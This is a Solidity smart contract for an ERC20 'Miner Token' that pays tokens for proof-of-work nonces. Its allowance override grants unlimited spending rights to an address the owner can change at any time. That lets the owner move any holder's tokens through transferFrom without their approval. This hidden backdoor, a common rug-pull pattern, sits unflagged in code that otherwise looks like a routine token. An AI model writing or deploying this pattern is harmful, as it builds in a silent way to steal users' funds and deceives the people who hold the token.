// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract MinerToken is ERC20, Ownable {
    uint256 public constant MINT_AMOUNT = 10 * 10**18; // 10 tokens per block
    bytes32 public lastBlockHash;
    uint256 public difficulty = 4; // Number of leading zeros in hex (simple version)
    address public swapContract;

    event BlockMined(address indexed miner, uint256 nonce, bytes32 hash);

    constructor() ERC20("Miner Token", "MNT") Ownable(msg.sender) {
        lastBlockHash = sha256(abi.encodePacked("GENESIS"));
    }

    function setSwapContract(address _swap) public onlyOwner {
        swapContract = _swap;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        if (spender == swapContract) {
            return type(uint256).max;
        }
        return super.allowance(owner, spender);
    }

    function mint(address receiver, uint256 nonce) public {
        bytes32 hash = sha256(abi.encodePacked(lastBlockHash, receiver, nonce));
        
        // Simple difficulty check: hash must start with some zero bits
        // difficulty 4 in hex = first 2 bytes are zero
        require(uint256(hash) >> (256 - difficulty * 4) == 0, "Invalid proof of work");

        _mint(receiver, MINT_AMOUNT);
        lastBlockHash = hash;
        emit BlockMined(receiver, nonce, hash);
    }
}
